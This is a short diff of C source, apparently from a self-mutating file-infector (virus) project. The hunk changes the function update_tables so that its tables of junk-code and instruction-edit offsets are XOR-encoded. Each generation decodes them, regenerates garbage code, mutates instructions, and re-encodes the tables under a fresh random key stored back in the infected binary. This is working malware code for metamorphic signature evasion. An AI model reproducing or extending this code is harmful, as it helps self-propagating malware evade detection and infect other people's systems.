@@ -169,15 +169,27 @@ void update_tables(unsigned char *b, size_t len, struct s_infect_params p) {
 	unsigned int gb_table_len = *((unsigned int *)(b + p.gb_table_len_off));
 	Modif *modif_table = ((Modif *)(b + p.modif_table_off));
 	unsigned int modif_table_len = *((unsigned int *)(b + p.modif_table_len_off));
-
+	unsigned int num_to_xor = ((unsigned int*)(b + p.num_to_xor_off))[0];
+	unsigned int new_num_to_xor = ft_rand();
 	for (size_t i = 0 ; i < gb_table_len; i++){
+		//decode
+		gb_table[i].off ^= num_to_xor;
+		gb_table[i].len ^= num_to_xor;
 		generate_garb((char*)b + gb_table[i].off, gb_table[i].len);
+		//encode
+		gb_table[i].off ^= new_num_to_xor;
+		gb_table[i].len ^= new_num_to_xor;
 	}
 
 	for (size_t i = 0 ; i < modif_table_len; i++){
+		modif_table[i].off ^= num_to_xor;
+		modif_table[i].len ^= num_to_xor;
 		int xx = edit_ins(b + modif_table[i].off);
 		debug_ext("for ", i, " >> ",xx," \n");
+		modif_table[i].off ^= new_num_to_xor;
+		modif_table[i].len ^= new_num_to_xor;
 	}
+	((unsigned int*)(b + p.num_to_xor_off))[0] = new_num_to_xor;
 }
 
 //=============================================================
